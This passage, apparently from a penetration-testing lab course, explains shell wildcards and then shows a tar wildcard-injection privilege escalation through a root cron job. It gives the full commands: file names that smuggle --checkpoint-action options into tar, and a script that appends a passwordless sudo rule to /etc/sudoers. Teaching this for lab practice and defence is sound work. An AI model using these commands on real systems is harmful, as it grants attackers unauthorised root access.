A wildcard character can be used as a replacement for other characters and are interpreted by the shell before other actions. Examples of wild cards include:

|**Character**|**Significance**|
|---|---|
|`*`|An asterisk that can match any number of characters in a file name.|
|`?`|Matches a single character.|
|`[ ]`|Brackets enclose characters and can match any single one at the defined position.|
|`~`|A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.|
|`-`|A hyphen within brackets will denote a range of characters.|
An example of how wildcards can be abused for privilege escalation is the `tar` command, a common program for creating/extracting archives. If we look at the [man page](http://man7.org/linux/man-pages/man1/tar.1.html) for the `tar` command, we see the following:

```
htb_student@NIX02:~$ man tar

<SNIP>
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.
```

The `--checkpoint-action` option permits an `EXEC` action to be executed when a checkpoint is reached (i.e., run an arbitrary operating system command once the tar command executes.) By creating files with these names, when the wildcard is specified, `--checkpoint=1` and `--checkpoint-action=exec=sh root.sh` is passed to `tar` as command-line options. Let's see this in practice.

We can leverage the wild card in the cron job to write out the necessary commands as file names with the above in mind. When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify.

```
htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
htb-student@NIX02:~$ echo "" > --checkpoint=1
```

Once the cron job runs again, we can check for the newly added sudo privileges and sudo to root directly.

        shellsession
`htb-student@NIX02:~$ sudo -l`
